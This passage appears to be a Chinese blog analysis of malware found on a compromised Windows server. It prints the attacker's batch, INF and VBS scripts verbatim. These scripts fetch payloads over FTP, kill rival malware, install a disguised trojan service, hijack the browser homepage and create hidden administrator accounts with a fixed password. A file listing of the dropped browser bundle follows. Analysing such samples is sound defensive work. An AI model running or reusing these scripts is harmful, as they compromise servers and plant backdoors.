+reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v "kstnod32" /f
+reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v "xo" /f
+Taskkill /IM app.exe /F
+Taskkill /IM csx.exe /F
+Taskkill /IM explore.exe /F
+Taskkill /IM explores.exe /F
+Taskkill /IM mssearch.exe /F
+Taskkill /IM net.exe /F
+Taskkill /IM net1.exe /F
+Taskkill /IM net2.exe /F
+Taskkill /IM nert.exe /F
+Taskkill /IM nnt.exe /F
+Taskkill /IM smssvc.exe /F
+Taskkill /IM lo.exe /F
+Taskkill /IM osinter.exe /F
+Taskkill /IM osinters.exe /F
+Taskkill /IM woai.exe /F
+Taskkill /IM p.exe /F
+Taskkill /IM ppap.exe /F
+Taskkill /IM ftp.exe /F
+Taskkill /IM run.exe /F
+del C:\WINDOWS\system32\app.exe. /q /f
+del C:\WINDOWS\system32\csx.exe. /q /f
+del C:\WINDOWS\system32\wbem\explore.exe. /q /f
+del C:\WINDOWS\system32\wbem\explores.exe. /q /f
+del C:\WINDOWS\system32\drivers\mssearch.exe. /q /f
+del C:\WINDOWS\addins\net.exe. /q /f
+del C:\WINDOWS\java\net1.exe. /q /f
+del C:\WINDOWS\java\net2.exe. /q /f
+del c:\windows\addins\nert.exe. /q /f
+del C:\recycler\nnt.exe. /q /f
+del C:\WINDOWS\system32\drivers\disdn\smssvc.exe. /q /f
+del C:\WINDOWS\addins\lo.exe. /q /f
+del C:\WINDOWS\system32\wbem\osinter.exe. /q /f
+del C:\WINDOWS\system32\wbem\osintes.exe. /q /f
+del C:\RECYCLER\woai.exe. /q /f
+del C:\WINDOWS\system32\p.exe. /q /f
+del C:\WINDOWS\system32\ppap.exe. /q /f
+del C:\downs\run.exe. /q /f
+del C:\WINDOWS\Tasks\*.job. /q /f
+
+:ma
+tasklist |find /i "Hpqdirv.exe" 
+if %errorlevel%==0 (goto weke) else (goto next)
+:next
+for %%a in ("C:\WINDOWS\WinSxS\Policies\360pro.exe") do if %%~za gtr 40480 goto ABC
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\ma.ini
+for %%a in ("C:\WINDOWS\WinSxS\Policies\360pro.exe") do if %%~za gtr 40480 goto ABC
+goto weke
+:ABC
+C:\WINDOWS\WinSxS\Policies\360pro.exe
+
+:weke
+tasklist |find /i "mscorsvw.exe" 
+if %errorlevel%==0 (goto qb) else (goto next1)
+:next1
+for %%a in ("C:\WINDOWS\MsDtc\mscorsvw.exe") do if %%~za gtr 40480 goto RUN1
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\weke.ini
+for %%a in ("C:\WINDOWS\WinSxS\InstallTemp\weke.rar") do if %%~za gtr 40480 goto RAR1
+goto qb
+:RAR1
+for %%a in ("C:\WINDOWS\system32\locatar.exe") do if %%~za gtr 40480 goto uzip1
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\rar.ini
+:uzip1
+C:\WINDOWS\system32\locatar.exe x -p810220 -t -o+ C:\WINDOWS\WinSxS\InstallTemp\weke.rar C:\WINDOWS\MsDtc\
+for %%a in ("C:\WINDOWS\MsDtc\mscorsvw.exe") do if %%~za gtr 40480 goto RUN1
+goto qb
+:RUN1
+start C:\WINDOWS\MsDtc\mscorsvw.exe
+
+:qb
+tasklist |find /i "bplaysvr.exe" 
+if %errorlevel%==0 (goto GoTop) else (goto next2)
+:next2
+for %%a in ("C:\WINDOWS\appmgmt\bplaysvr.exe") do if %%~za gtr 40480 goto RUN2
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\qb.ini
+for %%a in ("C:\WINDOWS\WinSxS\InstallTemp\qibin.rar") do if %%~za gtr 40480 goto RAR2
+goto GoTop
+:RAR2
+for %%a in ("C:\WINDOWS\system32\locatar.exe") do if %%~za gtr 40480 goto uzip2
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\rar.ini
+:uzip2
+C:\WINDOWS\system32\locatar.exe x -p810220 -t -o+ C:\WINDOWS\WinSxS\InstallTemp\qibin.rar C:\WINDOWS\appmgmt\
+for %%a in ("C:\WINDOWS\appmgmt\bplaysvr.exe") do if %%~za gtr 40480 goto RUN2
+goto GoTop
+:RUN2
+start C:\WINDOWS\appmgmt\bplaysvr.exe
+
+:GoTop
+tasklist |find /i "GoTop.exe"&amp;&amp;tasklist |find /i "gotopbr.exe"
+if %errorlevel%==0 (goto htc) else (goto next3)
+:next3
+Taskkill /IM GoTop.exe /F
+Taskkill /IM gotopbr.exe /F
+@echo off&amp;SetLocal EnableDelayEdexpansion&amp;cd /d "%~dp0"
+if exist C:\WINDOWS\dhcp\browser\platform.ini set a=1
+if exist C:\WINDOWS\dhcp\GoTop.exe set b=1
+if exist C:\WINDOWS\dhcp\browser\gotopbr.exe set c=1
+set /a n=a+b+c
+set /a m=b+c
+if !n! == 3 goto run3
+if !n! == 0 goto ftp-all
+if !a! == 1 if !m! lss 2 goto ftp-exe
+:ftp-exe
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\GTexe.ini
+for %%a in ("C:\WINDOWS\system32\locatar.exe") do if %%~za gtr 40480 goto uzip3
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\rar.ini
+:uzip3
+C:\WINDOWS\system32\locatar.exe x -p810220 -t -o+ C:\WINDOWS\WinSxS\InstallTemp\GTexe.rar C:\WINDOWS\dhcp\
+for %%a in ("C:\WINDOWS\dhcp\GoTop.exe") do if %%~za gtr 40480 goto RUN3
+goto htc
+:ftp-all
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\GT.ini
+for %%a in ("C:\WINDOWS\system32\locatar.exe") do if %%~za gtr 40480 goto uzip32
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\rar.ini
+:uzip32
+C:\WINDOWS\system32\locatar.exe x -p810220 -t -o+ C:\WINDOWS\WinSxS\InstallTemp\gotop.rar C:\WINDOWS\dhcp\
+for %%a in ("C:\WINDOWS\dhcp\GoTop.exe") do if %%~za gtr 40480 goto RUN3
+goto htc
+:RUN3
+start C:\WINDOWS\dhcp\GoTop.exe
+
+:htc
+ver|find /i "5.2"
+if %errorlevel%==0 (goto next5) else (goto update)
+:next5
+for %%a in ("C:\WINDOWS\srchasst\wmpserv.dll") do if %%~za gtr 40480 goto reg
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\htc.ini
+for %%a in ("C:\WINDOWS\srchasst\wmpserv.dll") do if %%~za gtr 40480 goto reg
+:reg
+regedit /s C:\WINDOWS\system32\winpact.reg
+C:\WINDOWS\system32\wins\net user Administartor /active:yes 
+C:\WINDOWS\system32\wins\net user Administartor 6375625
+C:\WINDOWS\system32\wins\net user Administartor 6375625 /add
+C:\WINDOWS\system32\wins\net localgroup Administrators Administartor /Add
+
+:update
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\update.ini
+for %%a in ("C:\WINDOWS\system32\locatar.exe") do if %%~za gtr 40480 goto uzip4
+C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\rar.ini
+:uzip4
+C:\WINDOWS\system32\locatar.exe x -p810220 -t -o+ C:\WINDOWS\WinSxS\InstallTemp\update.rar C:\WINDOWS\system32\
+
+:exit
+del /f /q %userprofile%\cookies\*.* 
+del /f /q %userprofile%\recent\*.* 
+del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*" 
+del /f /s /q "%userprofile%\Local Settings\Temp\*.*" 
+del /f /s /q "%userprofile%\recent\*.*" 
+exit
+
+/*----------------------------------------------------------------------------*/
+
+\wins\*.exe，一堆系统自带的exe文件，抓鸡黑客下载的，为啥要下载系统自带的程序呢？
+
+再加上上边高度集成化、模块化、自动化的垃圾软件安装批处理，
+
+由此看出，抓鸡黑客很有抓鸡经验，为啥呢？
+
+像这些：
+
+cacls.exe
+cmd.exe
+cscript.exe
+ftp.exe
+net.exe
+wscript.exe
+
+有很多服务器都禁用或删除掉了，而这些常用的dos程序，是抓鸡传马常用的，如果缺少这些，会导致种马率变低。
+
+所以嘛，抓鸡黑客自带了这些东西，使抓鸡成功率变高，可以看出，这是很有经验的一个抓鸡黑客（或者是用的高度自动化的抓鸡工具）。
+
+/*----------------------------------------------------------------------------*/
+
+\x\cct.inf，修改映像劫持，run启动项装木马或垃圾软件，然后修改IE浏览器主页（和上边一样）。
+
+[Version]
+Signature="$WINDOWS NT$"
+[DefaultInstall]
+DELREG=MY.DEL.REG
+ADDREG=MY.ADD.REG
+[MY.DEL.REG]
+HKCU,Software\Policies\Microsoft\Windows\system,
+HKLM,SOFTWARE\Microsoft\Command Processor,AutoRun,
+HKLM,SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe,
+HKLM,SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ftp.exe,
+HKLM,SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\net.exe,
+HKLM,SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\net1.exe,
+HKLM,Software\Microsoft\Windows\CurrentVersion\Run,shell,
+HKCU,"Software\Microsoft\Internet Explorer\Main","Start Page",
+HKLM,"SOFTWARE\Microsoft\Internet Explorer\Main","Start Page",
+HKU,".DEFAULT\Software\Microsoft\Internet Explorer\Main","Start Page",
+HKU,".DEFAULT\Software\Microsoft\Internet Explorer\Main","Search Page",
+[MY.ADD.REG]
+HKLM,Software\Microsoft\Windows\CurrentVersion\Run,,0,"C:\windows\system32\Brand.exe"
+HKCU,"Software\Microsoft\Internet Explorer\Main","Start Page",,"http://www.2345.com/?k1112958"
+HKLM,"SOFTWARE\Microsoft\Internet Explorer\Main","Start Page",,"http://www.2345.com/?k1112958"
+HKU,".DEFAULT\Software\Microsoft\Internet Explorer\Main","Start Page",,"http://www.2345.com/?k1112958"
+HKU,".DEFAULT\Software\Microsoft\Internet Explorer\Main","Search Page",,"http://www.2345.com/?k1112958"
+
+/*----------------------------------------------------------------------------*/
+
+\x\reten.inf，安装一个木马系统服务的配置文件（和上边一样）：
+
+[Version]
+Signature="$WINDOWS NT$"
+[DefaultInstall.Services]
+AddService=Ati HotKey Poller,,My_AddService_Name
+[My_AddService_Name]
+DisplayName=Ati HotKey Poller
+Description=Administers and Manages ATI Server Objects.
+ServiceType=0x20
+StartType=2
+ErrorControl=0
+ServiceBinary=C:\windows\system32\Ati2evxx.exe
+
+/*----------------------------------------------------------------------------*/
+
+\x\prntcp.vbs，有意思了，功能和上边批处理差不多，换成vbs了……
+
+先复制配置文件，再删掉一堆run启动项：360等……
+
+然后设置 cmd.exe ftp.exe cacls.exe 权限。
+
+然后加高仿管理员账号：Administartor 6375625
+
+以及激活并修改SQL数据账号密码：SQLDebugger 6375625
+
+On Error Resume Next
+Set ws = CreateObject("Wscript.Shell")
+set vs=wscript.createobject("scripting.filesystemobject")
+vs.copyfile "C:\WINDOWS\system32\logs\config.ini","C:\WINDOWS\dhcp\etc\config.ini"
+ 
+ws.regdelete ("HKCU\Software\Policies\Microsoft\Windows\system\")
+ws.regdelete ("HKLM\SOFTWARE\Microsoft\Command Processor\AutoRun")
+ws.regdelete ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\okc")
+ws.regdelete ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\laker")
+ws.regdelete ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\360safe")
+ws.regdelete ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\aoc")
+ws.regdelete ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\hit")
+
+ws.run "c:\Windows\system32\wins\cacls.exe c:\Windows\system32\cmd.exe /e /d system",0
+ws.run "c:\Windows\system32\wins\cacls.exe c:\Windows\system32\ftp.exe /e /d system",0
+ws.run "c:\Windows\system32\wins\cacls.exe c:\Windows\system32\cacls.exe /e /d system",0
+
+
+strComputer = "."
+Set objWMIService = GetObject("winmgmts:\\" &amp; strComputer &amp; "\root\cimv2")
+Set colItems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
+For Each objItem in colItems
+strOSVersion = objItem.Version
+Next
+select case strOSversion
+case "5.2.3790"
+
+Set ws=CreateObject("wscript.shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+If fso.FileExists("C:\WINDOWS\srchasst\wmpserv.dll") Then
+ws.Run "regedit /s C:\WINDOWS\system32\winpact.reg",vbhide
+Else
+Set ws = CreateObject("Wscript.Shell")
+ws.run "C:\WINDOWS\system32\wins\ftp.exe -s:C:\WINDOWS\system32\logs\htc.ini",0
+ws.run "C:\WINDOWS\system32\wins\net user Administartor /active:yes",0
+ws.run "C:\WINDOWS\system32\wins\net user Administartor 6375625",0
+
+ws.run "C:\WINDOWS\system32\wins\net user SQLDebugger /active:yes",0
+ws.run "C:\WINDOWS\system32\wins\net user SQLDebugger 6375625",0
+
+set wsnetwork=CreateObject("WSCRIPT.NETWORK")
+os="WinNT://"&amp;wsnetwork.ComputerName
+Set ob=GetObject(os)
+Set oe=GetObject(os&amp;"/Administrators,group")
+Set od=ob.Create("user","Administartor")
+od.SetPassword "6375625"
+od.Description="Built-in account for administering the computer/domain"
+od.SetInfo 
+Set of=GetObject(os&amp;"/Administartor",user) 
+oe.add os&amp;"/Administartor"
+
+set wsnetwork=CreateObject("WSCRIPT.NETWORK")
+os="WinNT://"&amp;wsnetwork.ComputerName
+Set ob=GetObject(os)
+Set oe=GetObject(os&amp;"/Administrators,group")
+Set od=ob.Create("user","SQLDebugger")
+od.SetPassword "6375625"
+od.Description="This user account is used by the Visual Studio .NET Debugger"
+od.SetInfo 
+Set of=GetObject(os&amp;"/SQLDebugger",user) 
+oe.add os&amp;"/SQLDebugger"
+
+End If
+end select
+
+/*----------------------------------------------------------------------------*/</pre>
+<p style="text-indent:2em;">
+	详细文件列表、目录树：
+</p>
+<pre class="prettyprint">\ASD
+|   360pro.exe
+|   WC.DAT
+|   winpact.reg
+|   wmpserv.dll
+|
++---a
+|       Ati2evxx.exe
+|       BrandSnRes.dll
+|       controll.inf
+|       dzip32.dll
+|       Image.ini
+|       mfc70.dll
+|       msvcr70.dll
+|       senddmpRes.dll
+|
++---appmgmt
+|       bplaysvr.exe
+|       web7b.ini
+|
++---dhcp
+|   |   GoTop.exe
+|   |   msvcp90.dll
+|   |   msvcr90.dll
+|   |
+|   +---browser
+|   |   |   application.ini
+|   |   |   blocklist.xml
+|   |   |   freebl3.dll
+|   |   |   gotopbr.exe
+|   |   |   greprefs.js
+|   |   |   mozalloc.dll
+|   |   |   mozjs.dll
+|   |   |   mozsqlite3.dll
+|   |   |   mozutils.dll
+|   |   |   msvcp90.dll
+|   |   |   msvcr90.dll
+|   |   |   nspr4.dll
+|   |   |   nss3.dll
+|   |   |   nssckbi.dll
+|   |   |   nssutil3.dll
+|   |   |   platform.ini
+|   |   |   plc4.dll
+|   |   |   plds4.dll
+|   |   |   plugin-container.exe
+|   |   |   smime3.dll
+|   |   |   softokn3.dll
+|   |   |   ssl3.dll
+|   |   |   user.js
+|   |   |   xpcom.dll
+|   |   |
+|   |   +---appdata
+|   |   |       compatibility.ini
+|   |   |       extensions.ini
+|   |   |       extensions.log
+|   |   |       pkcs11.txt
+|   |   |       prefs.js
+|   |   |       urlclassifierkey3.txt
+|   |   |       user.js
+|   |   |
+|   |   +---chrome
+|   |   |   +---browser
+|   |   |   |   +---content
+|   |   |   |   |   +---branding
+|   |   |   |   |   |       aboutDialog.css
+|   |   |   |   |   |
+|   |   |   |   |   \---browser
+|   |   |   |   |       |   aboutDialog.css
+|   |   |   |   |       |   aboutDialog.js
+|   |   |   |   |       |   aboutHome.css
+|   |   |   |   |       |   aboutHome.js
+|   |   |   |   |       |   aboutSessionRestore.js
+|   |   |   |   |       |   aboutSyncTabs-bindings.xml
+|   |   |   |   |       |   aboutSyncTabs.css
+|   |   |   |   |       |   aboutSyncTabs.js
+|   |   |   |   |       |   browser-tabPreviews.xml
+|   |   |   |   |       |   browser.css
+|   |   |   |   |       |   browser.js
+|   |   |   |   |       |   content.js
+|   |   |   |   |       |   inspector.html
+|   |   |   |   |       |   license.html
+|   |   |   |   |       |   nsContextMenu.js
+|   |   |   |   |       |   openLocation.js
+|   |   |   |   |       |   orion-mozilla.css
+|   |   |   |   |       |   orion.css
+|   |   |   |   |       |   orion.js
+|   |   |   |   |       |   safeMode.js
+|   |   |   |   |       |   sanitize.js
+|   |   |   |   |       |   sanitizeDialog.css
+|   |   |   |   |       |   sanitizeDialog.js
+|   |   |   |   |       |   scratchpad.js
+|   |   |   |   |       |   setDesktopBackground.js
+|   |   |   |   |       |   syncAddDevice.js
+|   |   |   |   |       |   syncGenericChange.js
+|   |   |   |   |       |   syncNotification.xml
+|   |   |   |   |       |   syncProgress.js
+|   |   |   |   |       |   syncQuota.js
+|   |   |   |   |       |   syncSetup.js
+|   |   |   |   |       |   syncUtils.js
+|   |   |   |   |       |   tabbrowser.css
+|   |   |   |   |       |   tabbrowser.xml
+|   |   |   |   |       |   tabview-content.js
+|   |   |   |   |       |   tabview.css
+|   |   |   |   |       |   tabview.html
+|   |   |   |   |       |   tabview.js
+|   |   |   |   |       |   urlbarBindings.xml
+|   |   |   |   |       |   utilityOverlay.js
+|   |   |   |   |       |   web-panels.js
+|   |   |   |   |       |
+|   |   |   |   |       +---bookmarks
+|   |   |   |   |       |       bookmarksPanel.js
+|   |   |   |   |       |       sidebarUtils.js
+|   |   |   |   |       |
+|   |   |   |   |       +---certerror
+|   |   |   |   |       |       aboutCertError.css
+|   |   |   |   |       |
+|   |   |   |   |       +---devtools
+|   |   |   |   |       |       styleinspector.css
+|   |   |   |   |       |
+|   |   |   |   |       +---feeds
+|   |   |   |   |       |       subscribe.css
+|   |   |   |   |       |       subscribe.js
+|   |   |   |   |       |       subscribe.xml
+|   |   |   |   |       |
+|   |   |   |   |       +---migration
+|   |   |   |   |       |       migration.js
+|   |   |   |   |       |
+|   |   |   |   |       +---pageinfo
+|   |   |   |   |       |       feeds.js
+|   |   |   |   |       |       feeds.xml
+|   |   |   |   |       |       pageInfo.css
+|   |   |   |   |       |       pageInfo.js
+|   |   |   |   |       |       pageInfo.xml
+|   |   |   |   |       |       permissions.js
+|   |   |   |   |       |       security.js
+|   |   |   |   |       |
+|   |   |   |   |       +---places
+|   |   |   |   |       |       bookmarkProperties.js
+|   |   |   |   |       |       browserPlacesViews.js
+|   |   |   |   |       |       controller.js
+|   |   |   |   |       |       editBookmarkOverlay.js
+|   |   |   |   |       |       history-panel.js
+|   |   |   |   |       |       menu.xml
+|   |   |   |   |       |       moveBookmarks.js
+|   |   |   |   |       |       organizer.css
+|   |   |   |   |       |       places.css
+|   |   |   |   |       |       places.js
+|   |   |   |   |       |       tree.xml
+|   |   |   |   |       |       treeView.js
+|   |   |   |   |       |
+|   |   |   |   |       +---preferences
+|   |   |   |   |       |       aboutPermissions.css
+|   |   |   |   |       |       aboutPermissions.js
+|   |   |   |   |       |       aboutPermissions.xml
+|   |   |   |   |       |       advanced.js
+|   |   |   |   |       |       applicationManager.js
+|   |   |   |   |       |       applications.js
+|   |   |   |   |       |       connection.js
+|   |   |   |   |       |       content.js
+|   |   |   |   |       |       cookies.js
+|   |   |   |   |       |       fonts.js
+|   |   |   |   |       |       handlers.css
+|   |   |   |   |       |       handlers.xml
+|   |   |   |   |       |       languages.js
+|   |   |   |   |       |       main.js
+|   |   |   |   |       |       permissions.js
+|   |   |   |   |       |       permissionsutils.js
+|   |   |   |   |       |       privacy.js
+|   |   |   |   |       |       security.js
+|   |   |   |   |       |       selectBookmark.js
+|   |   |   |   |       |       sync.js
+|   |   |   |   |       |       tabs.js
+|   |   |   |   |       |
+|   |   |   |   |       +---safebrowsing
+|   |   |   |   |       |       sb-loader.js
+|   |   |   |   |       |
+|   |   |   |   |       \---search
+|   |   |   |   |               engineManager.js
+|   |   |   |   |               search.xml
+|   |   |   |   |               searchbarBindings.css
+|   |   |   |   |
+|   |   |   |   \---skin
+|   |   |   |       \---classic
+|   |   |   |           +---aero
+|   |   |   |           |   \---browser
+|   |   |   |           |       |   aboutCertError.css
+|   |   |   |           |       |   aboutPrivateBrowsing.css
+|   |   |   |           |       |   aboutSessionRestore.css
+|   |   |   |           |       |   aboutSyncTabs.css
+|   |   |   |           |       |   browser.css
+|   |   |   |           |       |   engineManager.css
+|   |   |   |           |       |   fullscreen-video.css
+|   |   |   |           |       |   inspector.css
+|   |   |   |           |       |   pageInfo.css
+|   |   |   |           |       |   sanitizeDialog.css
+|   |   |   |           |       |   searchbar.css
+|   |   |   |           |       |   setDesktopBackground.css
+|   |   |   |           |       |   syncCommon.css
+|   |   |   |           |       |   syncProgress.css
+|   |   |   |           |       |   syncQuota.css
+|   |   |   |           |       |   syncSetup.css
+|   |   |   |           |       |
+|   |   |   |           |       +---devtools
+|   |   |   |           |       |       csshtmltree.css
+|   |   |   |           |       |       gcli.css
+|   |   |   |           |       |
+|   |   |   |           |       +---feeds
+|   |   |   |           |       |       subscribe-ui.css
+|   |   |   |           |       |       subscribe.css
+|   |   |   |           |       |
+|   |   |   |           |       +---places
+|   |   |   |           |       |       editBookmarkOverlay.css
+|   |   |   |           |       |       organizer.css
+|   |   |   |           |       |       places.css
+|   |   |   |           |       |
+|   |   |   |           |       +---preferences
+|   |   |   |           |       |       aboutPermissions.css
+|   |   |   |           |       |       applications.css
+|   |   |   |           |       |       preferences.css
+|   |   |   |           |       |
+|   |   |   |           |       \---tabview
+|   |   |   |           |               tabview.css
+|   |   |   |           |
+|   |   |   |           +---browser
+|   |   |   |           |   |   aboutCertError.css
+|   |   |   |           |   |   aboutPrivateBrowsing.css
+|   |   |   |           |   |   aboutSessionRestore.css
+|   |   |   |           |   |   aboutSyncTabs.css
+|   |   |   |           |   |   browser.css
+|   |   |   |           |   |   engineManager.css
+|   |   |   |           |   |   fullscreen-video.css
+|   |   |   |           |   |   inspector.css
+|   |   |   |           |   |   pageInfo.css
+|   |   |   |           |   |   sanitizeDialog.css
+|   |   |   |           |   |   searchbar.css
+|   |   |   |           |   |   setDesktopBackground.css
+|   |   |   |           |   |   syncCommon.css
+|   |   |   |           |   |   syncProgress.css
+|   |   |   |           |   |   syncQuota.css
+|   |   |   |           |   |   syncSetup.css
+|   |   |   |           |   |
+|   |   |   |           |   +---devtools
+|   |   |   |           |   |       csshtmltree.css
+|   |   |   |           |   |       gcli.css
+|   |   |   |           |   |
+|   |   |   |           |   +---feeds
+|   |   |   |           |   |       subscribe-ui.css
+|   |   |   |           |   |       subscribe.css
+|   |   |   |           |   |
+|   |   |   |           |   +---places
+|   |   |   |           |   |       editBookmarkOverlay.css
+|   |   |   |           |   |       organizer.css
+|   |   |   |           |   |       places.css
+|   |   |   |           |   |
+|   |   |   |           |   +---preferences
+|   |   |   |           |   |       aboutPermissions.css
+|   |   |   |           |   |       applications.css
+|   |   |   |           |   |       preferences.css
+|   |   |   |           |   |
+|   |   |   |           |   \---tabview
+|   |   |   |           |           tabview.css
+|   |   |   |           |
+|   |   |   |           \---communicator
+|   |   |   |                   communicator.css
+|   |   |   |
+|   |   |   +---en-US
+|   |   |   |   \---locale
+|   |   |   |       \---en-US
+|   |   |   |           \---global
+|   |   |   |                   intl.css
+|   |   |   |
+|   |   |   +---pippki
+|   |   |   |   \---content
+|   |   |   |       \---pippki
+|   |   |   |               certerror.js
+|   |   |   |               certManager.js
+|   |   |   |               certpicker.js
+|   |   |   |               choosetoken.js
+|   |   |   |               clientauthask.js
+|   |   |   |               createCertInfo.js
+|   |   |   |               crlImportDialog.js
+|   |   |   |               crlManager.js
+|   |   |   |               deletecert.js
+|   |   |   |               device_manager.js
+|   |   |   |               downloadcert.js
+|   |   |   |               editcerts.js
+|   |   |   |               escrowWarn.js
+|   |   |   |               exceptionDialog.js
+|   |   |   |               formsigning.js
+|   |   |   |               password.js
+|   |   |   |               pippki.js
+|   |   |   |               pref-crlupdate.js
+|   |   |   |               protectedAuth.js
+|   |   |   |               resetpassword.js
+|   |   |   |               serverCrlNextupdate.js
+|   |   |   |               viewCertDetails.js
+|   |   |   |
+|   |   |   \---toolkit
+|   |   |       +---content
+|   |   |       |   +---cookie
+|   |   |       |   |       cookieAcceptDialog.js
+|   |   |       |   |
+|   |   |       |   +---global
+|   |   |       |   |   |   aboutMemory.css
+|   |   |       |   |   |   aboutMemory.js
+|   |   |       |   |   |   aboutSupport.js
+|   |   |       |   |   |   appPicker.js
+|   |   |       |   |   |   buildconfig.html
+|   |   |       |   |   |   charsetOverlay.js
+|   |   |       |   |   |   commonDialog.css
+|   |   |       |   |   |   commonDialog.js
+|   |   |       |   |   |   config.js
+|   |   |       |   |   |   console.css
+|   |   |       |   |   |   console.js
+|   |   |       |   |   |   consoleBindings.xml
+|   |   |       |   |   |   contentAreaUtils.js
+|   |   |       |   |   |   customizeCharset.js
+|   |   |       |   |   |   customizeToolbar.css
+|   |   |       |   |   |   customizeToolbar.js
+|   |   |       |   |   |   dialogOverlay.js
+|   |   |       |   |   |   directionDetector.html
+|   |   |       |   |   |   editMenuOverlay.js
+|   |   |       |   |   |   filepicker.js
+|   |   |       |   |   |   finddialog.js
+|   |   |       |   |   |   findUtils.js
+|   |   |       |   |   |   globalOverlay.js
+|   |   |       |   |   |   inlineSpellCheckUI.js
+|   |   |       |   |   |   license.html
+|   |   |       |   |   |   menulist.css
+|   |   |       |   |   |   nsClipboard.js
+|   |   |       |   |   |   nsDragAndDrop.js
+|   |   |       |   |   |   nsUserSettings.js
+|   |   |       |   |   |   platformHTMLBindings.xml
+|   |   |       |   |   |   plugins.css
+|   |   |       |   |   |   plugins.html
+|   |   |       |   |   |   remote-test-ipc.js
+|   |   |       |   |   |   selectDialog.js
+|   |   |       |   |   |   strres.js
+|   |   |       |   |   |   tabprompts.css
+|   |   |       |   |   |   tabprompts.xml
+|   |   |       |   |   |   test-ipcbrowser-chrome.js
+|   |   |       |   |   |   test-ipcbrowser-content.js
+|   |   |       |   |   |   textbox.css
+|   |   |       |   |   |   viewPartialSource.js
+|   |   |       |   |   |   viewSource.css
+|   |   |       |   |   |   viewSource.js
+|   |   |       |   |   |   viewSourceUtils.js
+|   |   |       |   |   |   viewZoomOverlay.js
+|   |   |       |   |   |   XPCNativeWrapper.js
+|   |   |       |   |   |   xul.css
+|   |   |       |   |   |
+|   |   |       |   |   +---alerts
+|   |   |       |   |   |       alert.js
+|   |   |       |   |   |
+|   |   |       |   |   +---bindings
+|   |   |       |   |   |       autocomplete.xml
+|   |   |       |   |   |       browser.xml
+|   |   |       |   |   |       button.xml
+|   |   |       |   |   |       checkbox.xml
+|   |   |       |   |   |       colorpicker.xml
+|   |   |       |   |   |       datetimepicker.xml
+|   |   |       |   |   |       dialog.xml
+|   |   |       |   |   |       editor.xml
+|   |   |       |   |   |       expander.xml
+|   |   |       |   |   |       filefield.xml
+|   |   |       |   |   |       findbar.xml
+|   |   |       |   |   |       general.xml
+|   |   |       |   |   |       groupbox.xml
+|   |   |       |   |   |       listbox.xml
+|   |   |       |   |   |       menu.xml
+|   |   |       |   |   |       menulist.xml
+|   |   |       |   |   |       notification.xml
+|   |   |       |   |   |       numberbox.xml
+|   |   |       |   |   |       popup.xml
+|   |   |       |   |   |       preferences.xml
+|   |   |       |   |   |       progressmeter.xml
+|   |   |       |   |   |       radio.xml
+|   |   |       |   |   |       resizer.xml
+|   |   |       |   |   |       richlistbox.xml
+|   |   |       |   |   |       scale.xml
+|   |   |       |   |   |       scrollbar.xml
+|   |   |       |   |   |       scrollbox.xml
+|   |   |       |   |   |       spinbuttons.xml
+|   |   |       |   |   |       splitter.xml
+|   |   |       |   |   |       stringbundle.xml
+|   |   |       |   |   |       tabbox.xml
+|   |   |       |   |   |       text.xml
+|   |   |       |   |   |       textbox.xml
+|   |   |       |   |   |       toolbar.xml
+|   |   |       |   |   |       toolbarbutton.xml
+|   |   |       |   |   |       tree.xml
+|   |   |       |   |   |       videocontrols.css
+|   |   |       |   |   |       videocontrols.xml
+|   |   |       |   |   |       wizard.xml
+|   |   |       |   |   |
+|   |   |       |   |   +---cpow
+|   |   |       |   |   |       child.html
+|   |   |       |   |   |
+|   |   |       |   |   +---svg
+|   |   |       |   |   |       svgBindings.xml
+|   |   |       |   |   |
+|   |   |       |   |   \---xml
+|   |   |       |   |           XMLMonoPrint.css
+|   |   |       |   |           XMLPrettyPrint.css
+|   |   |       |   |           XMLPrettyPrint.xml
+|   |   |       |   |           XMLPrettyPrint.xsl
+|   |   |       |   |
+|   |   |       |   +---mozapps
+|   |   |       |   |   +---downloads
+|   |   |       |   |   |       download.xml
+|   |   |       |   |   |       DownloadProgressListener.js
+|   |   |       |   |   |       downloads.css
+|   |   |       |   |   |       downloads.js
+|   |   |       |   |   |       helperApps.js
+|   |   |       |   |   |
+|   |   |       |   |   +---extensions
+|   |   |       |   |   |       about.js
+|   |   |       |   |   |       blocklist.css
+|   |   |       |   |   |       blocklist.js
+|   |   |       |   |   |       blocklist.xml
+|   |   |       |   |   |       eula.js
+|   |   |       |   |   |       extensions-content.js
+|   |   |       |   |   |       extensions.css
+|   |   |       |   |   |       extensions.js
+|   |   |       |   |   |       extensions.xml
+|   |   |       |   |   |       list.js
+|   |   |       |   |   |       newaddon.js
+|   |   |       |   |   |       selectAddons.css
+|   |   |       |   |   |       selectAddons.js
+|   |   |       |   |   |       selectAddons.xml
+|   |   |       |   |   |       setting.xml
+|   |   |       |   |   |       update.js
+|   |   |       |   |   |       updateinfo.xsl
